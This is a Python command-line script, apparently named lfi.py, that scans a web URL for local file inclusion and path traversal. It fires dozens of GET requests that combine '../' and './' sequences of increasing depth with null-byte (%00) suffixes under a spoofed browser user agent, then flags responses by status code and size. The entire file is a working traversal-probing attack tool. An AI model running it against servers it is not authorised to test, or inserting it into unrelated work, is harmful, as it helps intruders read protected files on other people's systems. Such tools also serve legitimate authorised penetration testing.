import itertools
import requests
import getopt
import sys

from urllib.parse import urlparse


USER_AGENT = {"User-Agent" : "Mozilla/5.0 (Windows NT 5.1; rv:8.0) Gecko/20100101 Firefox/8.0"}


def help():
    print("\t-u URL, --url=URL\tscan url")
    print("\t-p , --path      \tdir or file")
    print("\t--lfi            \tLocal File Inclusion/Path traversal")
    print("EXAMPLES: ")    
    print("\tlfi.py -u http://example.com -p test")
    print("\tlfi.py --url=http://example.com --path=test")


def good_code(code, text):
    good = "[+]"
    if code >= 400 and code <= 526:
        good = "[-]"
    return good + text


def lfi_get(url, payload, filter, deepth=5):
    dds = "../"
    ds = "./"
    for _ in range(deepth):
        resp = requests.get(f"{url}{dds}{payload}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{dds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{dds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{dds}{payload}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{payload}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{dds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{dds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{payload}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{payload}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{payload}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{dds}{ds}{payload}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{dds}{ds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
        
        resp = requests.get(f"{url}{ds}{dds}{payload}", headers=USER_AGENT, allow_redirects=False)
        print(good_code(resp.status_code, f"{ds}{dds}{payload} [code:{resp.status_code} size:{len(resp.content)}]"))
        dds += dds
        ds += ds
    
    dds = "../"
    for _ in range(deepth):
        ds = "./"
        for _ in range(deepth):
            resp = requests.get(f"{url}{ds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}{ds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}{dds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}{ds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}{dds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}/{ds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}/{ds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}/{dds}", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}/{dds} [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}/{ds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}/{ds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{dds}{ds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{dds}{ds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            
            resp = requests.get(f"{url}{ds}{dds}{payload}/{dds}%00", headers=USER_AGENT, allow_redirects=False)
            print(good_code(resp.status_code, f"{ds}{dds}{payload}/{dds}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
            ds += ds
        dds += dds
            

def parse_url(url):
    u = ""
    d = urlparse(url)
    if d.scheme:
        if not d.path:
            u = f"{d.scheme}://{d.netloc}/"
        elif not d.query:
            u = f"{d.scheme}://{d.netloc}{d.path}"
        else:
            u = f"{d.scheme}://{d.netloc}{d.path}?{d.query}"
    return u

    
def main():
    url = None
    path = None
    data = None
    deepth = 5
    filter = None
    try:
        try:
            opts, args = getopt.getopt(sys.argv[1:], "u:p:d:", ["url=", "path=", "deepth=", "data=", "filter="])
            for opt, arg in opts:            
                if opt in ("-u", "--url"):                    
                    url = arg
                elif opt in ("-p", "--path"):                    
                    path = arg
                elif opt in ("--deepth"):                    
                    deepth = arg
                elif opt in ("--filter"):                    
                    filter = tuple(map(int, arg.split(",")))
                elif opt in ("--data"):                    
                    data = arg
                else:
                    help()
                    sys.exit(0)
        except getopt.GetoptError as err:
            help()
            sys.exit(0)
        if url is not None and path is not None:
            url = parse_url(url)
            lfi_get(url, path, filter, int(deepth))
        else:
            help()
    except KeyboardInterrupt:
        sys.exit(0)
    except requests.ConnectionError as e:
        print(e)
    except requests.Timeout as e:
        print(e)
    except requests.RequestException as e:
        print(e)
    

if __name__ == "__main__":
    main()
